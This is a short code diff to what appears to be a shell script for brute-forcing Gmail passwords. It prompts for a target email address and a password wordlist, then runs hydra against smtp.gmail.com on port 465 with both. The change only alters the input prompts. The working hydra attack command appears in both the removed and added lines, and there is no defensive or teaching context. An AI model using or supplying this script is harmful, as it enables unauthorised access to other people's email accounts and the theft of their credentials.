@@ -11,11 +11,9 @@ echo """
                                                                   
                                                                                                                                               
 """
-echo enter mail :
-read varname
-echo enter wordlist :
-read wordname
-hydra -l $varname -P $wordname -s 465 -S -v -V -t 4 smtp.gmail.com smtp
+read -p 'enter mail : ' uservar
+read -p 'enter wordlist : ' wordname
+hydra -l $uservar -P $wordname -s 465 -S -v -V -t 4 smtp.gmail.com smtp
 
 
 
